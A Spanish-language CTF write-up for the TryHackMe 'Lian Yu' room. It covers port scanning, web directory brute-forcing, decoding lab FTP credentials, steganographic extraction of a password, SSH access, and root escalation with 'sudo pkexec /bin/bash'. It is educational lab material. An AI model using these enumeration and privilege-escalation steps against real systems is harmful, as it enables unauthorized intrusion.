# 🏹 Lian Yu — TryHackMe Write-Up

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** CTF / Linux  
**Objetivos:** Capturar `user.txt` y `root.txt`

---

## 📋 Índice

1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web](#enumeración-web)
3. [Acceso inicial — FTP](#acceso-inicial--ftp)
4. [Esteganografía](#esteganografía)
5. [Acceso SSH](#acceso-ssh)
6. [Escalada de privilegios](#escalada-de-privilegios)
7. [Flags](#flags)
8. [Conclusiones](#conclusiones)

---

## 🔍 Reconocimiento

El primer paso es un escaneo completo con **Nmap** para identificar puertos abiertos, servicios y versiones.

```bash
nmap -A -sV -sC <IP>
```

> 📸 ![](nmap.png)

El escaneo revela varios puertos abiertos, entre ellos el **21 (FTP)**, **22 (SSH)** y **80 (HTTP)**, que serán relevantes más adelante.

---

## 🌐 Enumeración Web

### Inspección manual

Al acceder a la web, se observa que la palabra **"arrow"** aparece en negrita — una posible pista para más adelante.

### Gobuster — Descubrimiento de directorios

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

> 📸 ![](gobuster.png)

Se descubre el directorio **`/island`**.

### Feroxbuster — Enumeración en profundidad

Se prueba con dos wordlists distintas:

```bash
# Con common.txt — sin resultados relevantes
feroxbuster -u http://<IP>/ -w /usr/share/wordlists/common.txt

# Con big.txt — se confirma el directorio /island
feroxbuster -u http://<IP>/ -w /usr/share/wordlists/big.txt
```

> 📸 ![](feroxbuster_common.png]] ![[feroxbuster_big.png)

### FFUF — Fuzzing de extensiones

```bash
ffuf -u http://<IP>/island/FUZZ -w /usr/share/wordlists/...
```

> 📸 ![](ffuf.png)

### Análisis de resultados

Tras usar las tres herramientas se confirma la existencia del directorio **`/island`**. Al inspeccionarlo, se extraen dos datos clave:

- 🔑 **Palabra clave:** `vigilante`
- 📌 **Referencia:** `Lian_Yu` en negrita

### Enumeración del subdirectorio `/island`

Se lanza un segundo Gobuster sobre `/island`:

```bash
gobuster dir -u http://<IP>/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

> 📸 ![](gobuster_small.png)

Se descubre **`/island/2100`** — una página con un vídeo embebido. Al revisar el código fuente se encuentra la siguiente pista:

> *"You can redeem your `.ticket` here"*

Esto indica que hay un archivo con extensión `.ticket` en algún subdirectorio. Se lanza un nuevo Gobuster buscando esa extensión:

```bash
gobuster dir -u http://<IP>/island/2100/ -x ticket -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> 📸 ![](gobuster_medium.png)

Se descubre el archivo final, que contiene una cadena codificada.

> 📸 ![](pass_web.png)

### Decodificación

La cadena está codificada en **Base58**. Tras decodificarla se obtiene la contraseña:

```
!#th3h00d
```

---

## 📂 Acceso inicial — FTP

Con las credenciales obtenidas se accede al servidor FTP (puerto 21):

| Campo | Valor |
|-------|-------|
| Usuario | `vigilante` |
| Contraseña | `!#th3h00d` |

```bash
ftp <IP>
```

> 📸 ![](ssh_vigilante.png)

Dentro del servidor se descargan los siguientes archivos:

```bash
get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
get .other_user
```

Al explorar el directorio raíz del FTP se identifican **dos usuarios** en el sistema:

- `vigilante` (usuario actual)
- `slade` (sin permisos de acceso directo → necesitaremos escalar)

---

## 🖼️ Esteganografía

Las imágenes descargadas pueden contener datos ocultos. Se utiliza **stegseek** para extraer información:

```bash
stegseek aa.jpg /usr/share/wordlists/rockyou.txt
```

> 📸 ![](stegseek.png)

Los datos no estaban cifrados, por lo que la extracción no requirió contraseña. El resultado es un archivo comprimido: **`aa.jpg.out`**.

```bash
unzip aa.jpg.out
```

Se obtienen dos archivos:

| Archivo | Contenido |
|---------|-----------|
| `passwd.txt` | Texto narrativo (lore de la máquina) |
| `shado` | Contraseña del usuario `slade` |

---

## 🔐 Acceso SSH

Con la contraseña extraída del archivo `shado`, se accede al sistema como el usuario `slade` vía SSH:

```bash
ssh slade@<IP>
```

> 📸 ![](ssh_slade.png)

Una vez dentro, se obtiene la primera flag:

```bash
ls -la
cat user.txt
```

✅ **Flag de usuario capturada.**

---

## ⚡ Escalada de privilegios

### Enumeración de permisos sudo

Desde el directorio raíz se comprueba qué comandos puede ejecutar `slade` con privilegios elevados:

```bash
sudo -l
```

El resultado muestra que `slade` puede ejecutar **`pkexec`** como root.

### Explotación con GTFOBins

Se consulta [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/) para obtener el vector de escalada con `pkexec`:

> 📸 ![](GTFObins.png)

```bash
sudo pkexec /bin/bash
```

Con acceso como root, se localiza la flag final:

```bash
ls -la /root
cat /root/root.txt
```

> 📸 ![](flag_root.png)

✅ **Flag de root capturada.**

---

## 🚩 Flags

| Flag | Estado |
|------|--------|
| `user.txt` | ✅ Capturada |
| `root.txt` | ✅ Capturada |

---

## 📚 Conclusiones

### Herramientas utilizadas

| Herramienta | Propósito |
|-------------|-----------|
| `nmap` | Escaneo de puertos y servicios |
| `gobuster` / `feroxbuster` / `ffuf` | Enumeración de directorios web |
| `ftp` | Acceso y descarga de archivos |
| `stegseek` | Extracción de datos esteganográficos |
| `ssh` | Acceso remoto al sistema |
| `sudo -l` + `pkexec` | Escalada de privilegios |

### Lecciones aprendidas

- La enumeración web exhaustiva con múltiples herramientas es clave para no perder directorios ocultos.
- Siempre revisar el **código fuente** de las páginas — puede contener pistas críticas.
- Los archivos descargados deben analizarse con herramientas de esteganografía cuando no hay una vía directa de escalada.
- `sudo -l` debe ser uno de los primeros comandos al conseguir acceso a un sistema Linux.

---

*Write-up realizado como parte del aprendizaje práctico en TryHackMe.*  
*Máquina: [Lian Yu](https://tryhackme.com/room/lianyu)*
